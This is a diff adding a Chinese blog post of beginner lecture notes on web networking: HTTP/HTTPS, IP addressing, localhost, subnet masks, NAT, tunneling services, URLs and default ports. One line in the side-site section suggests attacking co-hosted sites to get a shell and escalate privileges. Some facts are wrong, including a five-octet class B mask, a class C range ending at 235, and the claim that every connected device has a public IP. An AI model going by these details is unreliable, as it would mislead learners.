@@ -1,0 +1,1439 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Y.png">
+  <link rel="icon" href="/img/Y.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Colourful">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言今天听到强哥@红烧花园宝宝问了一个很基础的web知识，虽然答上来了但感觉有些生疏了，就正好借这个给新生讲课的机会，梳理一下web网络的一些基础知识，巩固一下。 Web概念定义Web就是万维网（World Wide Web）的简称，是我们日常浏览网页、看视频、查资料等互联网所依赖的一个信息系统，本质是你用浏览器发请求，服务器把页面或数据传回来展示给你看。 组成网页：用HTML编写的内容页面，可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web网络基础">
+<meta property="og:url" content="https://colourful228.github.io/2026/08/25/Web%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="Colourful">
+<meta property="og:description" content="前言今天听到强哥@红烧花园宝宝问了一个很基础的web知识，虽然答上来了但感觉有些生疏了，就正好借这个给新生讲课的机会，梳理一下web网络的一些基础知识，巩固一下。 Web概念定义Web就是万维网（World Wide Web）的简称，是我们日常浏览网页、看视频、查资料等互联网所依赖的一个信息系统，本质是你用浏览器发请求，服务器把页面或数据传回来展示给你看。 组成网页：用HTML编写的内容页面，可以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://colourful228.github.io/2026/08/25/Web%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20260826153711435.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/08/25/Web%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20260826153731218.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/08/25/Web%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20260826145548435.png">
+<meta property="article:published_time" content="2026-08-24T16:05:36.000Z">
+<meta property="article:modified_time" content="2026-08-26T07:37:32.271Z">
+<meta property="article:author" content="Colourful">
+<meta property="article:tag" content="Web基础知识">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://colourful228.github.io/2026/08/25/Web%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20260826153711435.png">
+<meta name="twitter:creator" content="@Colorful">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Web网络基础 - Colourful</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"colourful228.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2026-01-09T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Colorful的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/M.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Web网络基础"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Colourful
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-08-25 00:05" pubdate>
+          2026年8月25日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          69 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Web网络基础</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2026-08-26T15:37:32+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天听到强哥<a target="_blank" rel="noopener" href="https://lxu2n.github.io/">@红烧花园宝宝</a>问了一个很基础的web知识，虽然答上来了但感觉有些生疏了，就正好借这个给新生讲课的机会，梳理一下web网络的一些基础知识，巩固一下。</p>
+<h1 id="Web概念"><a href="#Web概念" class="headerlink" title="Web概念"></a>Web概念</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>Web就是万维网（World Wide Web）的简称，是我们日常浏览网页、看视频、查资料等互联网所依赖的一个信息系统，本质是你用浏览器发请求，服务器把页面或数据传回来展示给你看。</p>
+<h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p><strong>网页</strong>：用HTML编写的内容页面，可以包含文字、图片、视频、链接等</p>
+<p><img src="/2026/08/25/Web%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20260826153711435.png" srcset="/img/loading.gif" lazyload alt="image-20260826153711435"></p>
+<p>像这样一个网站它的网页，我们可以<code>ctrl+u</code>查看源码，就是用HTML语言编写的。</p>
+<p><strong>浏览器（Browser）</strong>：就是用来访问和展示网页的，比如谷歌浏览器，火狐浏览器还有微软这种</p>
+<p><strong>Web服务器</strong>：用来存放网页内容的服务器，当用户访问网页的时候，服务就会把网页发送给浏览器。常见的服务器比如Apache，Nginx等等</p>
+<p><strong>HTTP&#x2F;HTTPS协议</strong>：网页通信的规则，主要是让浏览器和服务器“对话”</p>
+<ul>
+<li>HTTP协议：明文传输，你发的账号密码、Cookie 都能被中间人直接看到，默认走 80 端口</li>
+<li>HTTPS协议：在 HTTP 基础上套了一层 <strong>SSL&#x2F;TLS 加密</strong>，数据被加密，中间人截了也看不懂，默认走 <strong>443 端口</strong>，现在正规网站基本都是它</li>
+</ul>
+<h1 id="IP概念"><a href="#IP概念" class="headerlink" title="IP概念"></a>IP概念</h1><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>IP是互联网协议（Internet Protocol）的缩写，是计算机网络中用于标识设备地址和实现网络通信的核心协议之一。简单来说就是<strong>设备的“网络门牌号”</strong>，有了它，数据才知道该往哪台设备送。</p>
+<h2 id="主要作用"><a href="#主要作用" class="headerlink" title="主要作用"></a>主要作用</h2><ul>
+<li>设备标识：当设备连接到网络的时候，就会自动被分配到一个唯一的IP地址，作为标识，这就相当于一个门牌号，可以让数据准确的传送到目标设备</li>
+<li>数据传输：IP负责把数据从一个设备送到另一个设备，相当于邮局投递的地址系统</li>
+</ul>
+<h2 id="IP地址类型"><a href="#IP地址类型" class="headerlink" title="IP地址类型"></a>IP地址类型</h2><ul>
+<li>IPv4：IPv4是主流使用的协议，格式如192.168.1.1（四组十进制数字，每组范围是0~255，用点分隔）总共约42亿个地址</li>
+<li>IPv6：为了解决IPv4地址枯竭的问题而提出的，是新一代协议，格式为<code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code>（128 位，八组十六进制数字组成，以冒号分隔，更长更复杂），地址数量几乎无限</li>
+</ul>
+<h2 id="公网IP和私网IP"><a href="#公网IP和私网IP" class="headerlink" title="公网IP和私网IP"></a>公网IP和私网IP</h2><ul>
+<li>公网IP：公网IP是互联网上的唯一地址（比如上网时用的IP）</li>
+</ul>
+<p>那什么是互联网呢，最常听到的一个名词，但具体概念可能会混淆。互联网就是全球所有网络连在一起的大网络，没有边界，简单来说就是一个只要有网就可以连的网络</p>
+<ul>
+<li>私网IP：私网IP就是局域网中使用的地址（比如说家里的wifi路由器分配的<code>192.168.x.x</code>）</li>
+</ul>
+<p>那和互联网对应的就是局域网。局域网就是一个局部的网络，比如家里的wifi，公司的办公网，学校机房的网络等等，可以把它想象成是小区内部的路，传输的数据都是在这些内部路上跑的，同样你可以访问到外界，但是外界正常默认情况下是无法访问到你的局域网的。就比如<code>192.168.x.x</code>、<code>172.16.x.x</code>、<code>10.x.x.x</code>，这就是比较常见的内网IP，别人无法访问到的</p>
+<h1 id="IP地址和域名的关系"><a href="#IP地址和域名的关系" class="headerlink" title="IP地址和域名的关系"></a>IP地址和域名的关系</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>本质上是互联网上用于标识主机或服务逻辑归属的、便于人类记忆的层次化字符标识，其核心功能是通过 DNS（Domain Name System，域名系统）完成与 IP 地址的映射解析，从而替代纯数字 IP 进行资源定位，域名只是便于记忆的“人类语言”，实际通信时会通过DNS系统将其转换为IP地址。</p>
+<h2 id="DNS系统"><a href="#DNS系统" class="headerlink" title="DNS系统"></a>DNS系统</h2><p>本质上是互联网的一套分布式、层次化的“电话簿”，核心作用就是在域名和IP地址进行双向映射解析，就是把域名这个“人类语言”转化为计算机可以看懂的IP+端口+协议</p>
+<h2 id="特殊IP地址"><a href="#特殊IP地址" class="headerlink" title="特殊IP地址"></a>特殊IP地址</h2><h3 id="回环地址"><a href="#回环地址" class="headerlink" title="回环地址"></a>回环地址</h3><p>定义：凡是127开头的都是回环地址（127.0.0.0~127.255.255.255），它所在的回环接口一般可以被理解为虚拟网卡，并不是真正的路由器接口，本质上是主机内部预留的一套“自洽型”虚拟网络接口地址。</p>
+<p>作用：127.0.0.1是最常见的回环地址，用于让设备向自己发送网络请求，而不是发给其他设备，主要用于本机网络功能的测试和调试</p>
+<h3 id="localhost"><a href="#localhost" class="headerlink" title="localhost"></a>localhost</h3><p>定义：是 RFC 6761 定义的保留主机名，属于应用层逻辑别名，一般Windows系统默认将localhost指向127.0.0.1，但localhost指向的IP地址是可以配置的。</p>
+<p>配置文件：</p>
+<ul>
+<li>Windows系统：<code>C:\Windows\System32\drivers\etc\hosts</code></li>
+<li>Linux&#x2F;macOS：<code>/etc/hosts</code></li>
+</ul>
+<p>看到这里我就想到这个可以配置要怎么理解呢，就可以类似于一个域名解析，默认是把localhost解析为127.0.0.1，但是进行配置修改了之后比如说改成<code>10.10.10.10 localhost</code>，那么这个时候访问localhost指向的就不再是127.0.0.1，而是10.10.10.10。</p>
+<p>那这里可以有一个小提问就是localhost和127.0.0.1回环地址都是指向的本机回环接口，那么根据上面我们讲过的一些知识能想到两者有什么区别吗？很简单的点，区别就是localhost它是域名，而127.0.0.1是IP</p>
+<h3 id="0-0-0-0"><a href="#0-0-0-0" class="headerlink" title="0.0.0.0"></a>0.0.0.0</h3><p>定义：一个特殊的IPv4地址，不是一个真实的IP地址，它不能用来“上网”，只能用于本机&#x2F;路由规则，在本机表示“所有 IPv4 接口”，在路由表中表示“所有未知目的地”。</p>
+<p>特点：不能被ping通，监听0.0.0.0的端口就是监听本机中所有IP的端口</p>
+<h1 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h1><h2 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h2><p>子网掩码是IPv4网络中用于区分IP地址中“网络位”和“主机位”32位二进制掩码，常见格式为：255.255.255.0，那对于这个<code>255.255.255.0</code>，表示如果两个IP的前三位一样，就是处于同一个网段，可以直接通信。就比如一个IP是<code>192.168.1.1</code>，一个是<code>192.168.1.2</code>，子网掩码是<code>255.255.255.0</code>，那么前面两个IP就是处于一个网段，就是可以直接通信的。</p>
+<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>子网掩码的作用是界定IP地址的网络位和主机位，用于判断通信是否同网段、支撑路由转发以及划分子网控制广播域，它就是网络通信和网络安全边界的一把基础标尺。</p>
+<p>怎么通过子网掩码去判断是网络位还是主机位呢？根据一个核心规则：<code>1</code>表示网络位，<code>0</code>表示主机位，那这个1和0就是对应的子网掩码转化成的二进制。</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">掩码：<span class="hljs-number">255.255.255.0</span><br>      <span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span><br>      ↑————————— 网络位 —————————↑  ↑主机位↑<br></code></pre></td></tr></table></figure>
+
+<h1 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h1><h2 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h2><p>网关是一种网络设备或者软件，主要作用是实现不同网络之间的通信和数据转换。它能连接两个或者多个采用不同协议、架构或者地址空间的网络（比如局域网与广域网、以太网与无线网络等等），对数据格式，协议进行转换，确保不同网络中的设备可以相互识别和交换信息。例如，家庭网络中，路由器通常兼具网关的功能：它一边连接家庭内部的局域网（比如电脑、手机等设备），另一边连接运营商的广域网（互联网），负责在两者之间转发和转换数据，让家庭设备能介入互联网。</p>
+<blockquote>
+<p>广域网，它不等同于互联网，广域网是一个技术概念，就是指覆盖城市、国家甚至跨国的远距离计算机的网络。而互联网是一个具体的实例，两者是一个包含关系，互联网是由全球无数个局域网和广域网通过TCP&#x2F;IP协议族互联啊而成的全球共有网络。</p>
+</blockquote>
+<h1 id="IP地址分类"><a href="#IP地址分类" class="headerlink" title="IP地址分类"></a>IP地址分类</h1><p>传统的 IP 地址分类（A-E 类）是靠固定掩码切分“网络位&#x2F;主机位”的古早规则</p>
+<h2 id="A类地址"><a href="#A类地址" class="headerlink" title="A类地址"></a>A类地址</h2><ul>
+<li>用途：超大型网络，比如跨国集团、运营商骨干、早期国家级&#x2F;军用网络。</li>
+<li>默认掩码：255.0.0.0（即&#x2F;8）</li>
+<li>A段范围：<code>1.0.0.0</code> ~ <code>126.255.255.255</code>（注：<code>127.x.x.x</code> 为回环保留）</li>
+<li>A 段 IP 总数：一个 A 段包含 2²⁴ &#x3D;16,777,216个 IP</li>
+</ul>
+<h2 id="B类地址"><a href="#B类地址" class="headerlink" title="B类地址"></a>B类地址</h2><ul>
+<li>范围：128.0.0.0~191.255.255.255</li>
+<li>子网掩码：255.255.0.0.0（即&#x2F;16）</li>
+<li>IP总数：2¹⁶ &#x3D; 65536个IP</li>
+<li>用途：大型网络，比如大学、企业</li>
+</ul>
+<h2 id="C类地址"><a href="#C类地址" class="headerlink" title="C类地址"></a>C类地址</h2><ul>
+<li>范围：<code>192.0.0.0</code>~&#96;235.255.255.255&#96;</li>
+<li>子网掩码：255.255.255.0（即&#x2F;24）</li>
+<li>IP总数：2⁸ &#x3D; 256 个 IP</li>
+<li>用途：小型网络，如家庭、工作组</li>
+</ul>
+<h1 id="网络类型"><a href="#网络类型" class="headerlink" title="网络类型"></a>网络类型</h1><h2 id="公网"><a href="#公网" class="headerlink" title="公网"></a>公网</h2><h3 id="定义-4"><a href="#定义-4" class="headerlink" title="定义"></a>定义</h3><p>公网就是整个互联网，可以被全球访问的网络，任何连上互联网的网络都可以被称为公网。</p>
+<h3 id="公网IP"><a href="#公网IP" class="headerlink" title="公网IP"></a>公网IP</h3><p>公网IP是唯一的、每一个连上互联网的设备都分配了一个公网IP地址。</p>
+<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>公网IP是网站服务器、游戏服务器等对外服务的基础，没有公网IP、外部用户无法访问服务器上的资源，使用公网IP，可以远程访问设备。</p>
+<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><h3 id="定义-5"><a href="#定义-5" class="headerlink" title="定义"></a>定义</h3><p>内网就是指在家庭、公司、学校等本地网络中使用的网络，不能之间被互联网访问，它是不直接暴露在公网上的，靠 NAT 和网关跟互联网“单线联系”。</p>
+<h3 id="内网IP"><a href="#内网IP" class="headerlink" title="内网IP"></a>内网IP</h3><p>内网IP地址是专门为内网使用的IP地址，不能之间在互联网上被识别。常见的内网IP段包括：<code>192.168.x.x</code>、<code>10.x.x.x</code>、<code>172.16.x.x</code>到<code>172.31.x.x</code>.</p>
+<h3 id="NAT技术"><a href="#NAT技术" class="headerlink" title="NAT技术"></a>NAT技术</h3><p>当内网中的设备想要访问互联网时，会通过一种叫“NAT（网络地址转换）”的技术，暂时把内网IP转换成一个公网IP，以便访问外部网络资源。</p>
+<h2 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h2><h3 id="定义-6"><a href="#定义-6" class="headerlink" title="定义"></a>定义</h3><p>局域网属于物理概念，表示一小个范围（比如家、公司、教室）内部租车给的网络。</p>
+<h3 id="局域网与内网关系"><a href="#局域网与内网关系" class="headerlink" title="局域网与内网关系"></a>局域网与内网关系</h3><p>局域网是技术概念，内网是业务&#x2F;安全概念；局域网侧重“物理范围小”，内网侧重“不暴露公网”。绝大多数情况下，咱们说“内网”指的就是以局域网为主体的私有网络，两者在日常和安服语境里基本可以划等号。整栋办公楼就是“内网”，每台设备有自己在内网中的 IP 地址（内网 IP），比如 192.168.1.2。外面的人想联系楼里的某台设备时，必须通过总台转接，这个总台类似于网络中的 NAT，会把内网 IP 换成公网 IP，以便让外面的人找到目标设备。两者在日常和安服语境里基本可以划等号。局域网就是指地理范围小的网络，内网指使用私有 IP、不直接暴露在公网的封闭网络。它通常由<strong>一个或多个局域网</strong>通过路由器&#x2F;专线连接起来组成。</p>
+<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>内网穿透是为了解决没有公网地址但又想可以从外部访问的问题。主要是通过在有公网IP的服务器上运行反向代理服务与局域网内某主机上运行的反向代理服务（Web服务器）之间建立一个安全的通道。远程通过访问公有云主机反向代理服务，跳到局域网服务器，并且可以通过它来间接访问局域网内其他存活的主机。</p>
+<h2 id="内网穿透服务示例"><a href="#内网穿透服务示例" class="headerlink" title="内网穿透服务示例"></a>内网穿透服务示例</h2><p>一般提供这个服务的应有有NKN、蒲公英、DDNSTO等等，各家采用的方式都不一样。</p>
+<h1 id="网页、网站、网络服务器和搜索引擎"><a href="#网页、网站、网络服务器和搜索引擎" class="headerlink" title="网页、网站、网络服务器和搜索引擎"></a>网页、网站、网络服务器和搜索引擎</h1><h2 id="网页定义"><a href="#网页定义" class="headerlink" title="网页定义"></a>网页定义</h2><p>网页是可以显示在网络浏览器（比如火狐、谷歌、微软）上的文档。</p>
+<h2 id="网站定义"><a href="#网站定义" class="headerlink" title="网站定义"></a>网站定义</h2><p>网站是一个由许多网页组合在一起，并常常以各种方式相互连接的网页组成的集合。网站常被称为“website”或者简称为“site”（站点）</p>
+<h2 id="Web服务器定义"><a href="#Web服务器定义" class="headerlink" title="Web服务器定义"></a>Web服务器定义</h2><p>Web服务器是一个在互联网上托管网站的计算机，能够接收来自客户端的请求，并根据请求返回对应的网页、图片、视频、文件等资源，像Apache、Nginx等都是常见的Web服务器软件。</p>
+<h2 id="搜索引擎定义"><a href="#搜索引擎定义" class="headerlink" title="搜索引擎定义"></a>搜索引擎定义</h2><p>搜索引擎是帮助你查找其他网页的网络读完，比如谷歌，Bing，百度等等。</p>
+<h2 id="旁站定义"><a href="#旁站定义" class="headerlink" title="旁站定义"></a>旁站定义</h2><p>同一服务器上的其他网站，在进行渗透测试的时候，如果目标网站难以直接攻破，可以寻找旁站，尝试getshell进行提权，简单来说就是在同一个 Web 服务器（同一个 IP）上，运行的其他网站&#x2F;业务系统。</p>
+<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>URL（统一资源定位符）是因特网中的唯一资源的地址。它是浏览器用于检索已发布资源（例如 HTML 页面、CSS 文档、图像等）的关键机制之一，就是 Web 世界里一个资源的“完整通信地址”</p>
+<h3 id="组成-1"><a href="#组成-1" class="headerlink" title="组成"></a>组成</h3><p>理论上说，每个有效的URL都指向一个唯一的资源。URL由不同的部分组成，其中一些是必须的，而另一些是可选的</p>
+<p>常见格式：<code>scheme://user:password@host:port/path?query#fragment</code></p>
+<ul>
+<li>scheme（协议）：必须的，表示的是用什么方式去访问资源，例如：http，https，file等等</li>
+<li>user:password@（用户:密码@）：可选。早期用于 FTP&#x2F;HTTP 基础认证之类，比如：<code>ftp://user:password@192.168.1.10/file.txt</code>，但是现在网页里很少见，也不安全，很多浏览器&#x2F;服务已经不支持或限制显示。</li>
+<li>host（主机）：通常必须。可以是域名或 IP，例如：<code>www.example.com</code>、<code>192.168.1.100</code>、<code>10.0.0.5</code>，它决定“去哪台服务器”。host文件位于 <code>C:\Windows\System32\drivers\etc\hosts</code>，相当于一个本地的 DNS 解析器，允许你在本地覆盖或自定义特定域名的 DNS 解析。</li>
+<li>port（端口）：可选。不写就用协议默认端口。<code>http</code> 默认 80，<code>https</code> 默认 443。</li>
+</ul>
+<p>常见的对应的默认端口</p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>端口</strong></th>
+<th align="center"><strong>服务</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>80</strong></td>
+<td align="center">HTTP</td>
+</tr>
+<tr>
+<td align="center"><strong>443</strong></td>
+<td align="center">HTTPS</td>
+</tr>
+<tr>
+<td align="center"><strong>8080</strong></td>
+<td align="center">HTTP 代理 &#x2F; Tomcat &#x2F; JBoss</td>
+</tr>
+<tr>
+<td align="center"><strong>3306</strong></td>
+<td align="center">MySQL</td>
+</tr>
+<tr>
+<td align="center"><strong>1433</strong></td>
+<td align="center">SQL Server</td>
+</tr>
+<tr>
+<td align="center"><strong>6379</strong></td>
+<td align="center">Redis</td>
+</tr>
+<tr>
+<td align="center"><strong>22</strong></td>
+<td align="center">SSH</td>
+</tr>
+<tr>
+<td align="center"><strong>21</strong></td>
+<td align="center">FTP</td>
+</tr>
+</tbody></table>
+<ul>
+<li>path（路径）：可选，但常见。表示服务器上的资源位置&#x2F;路由。例：<code>/index.html</code>、<code>/login.php</code>、<code>/api/user</code></li>
+</ul>
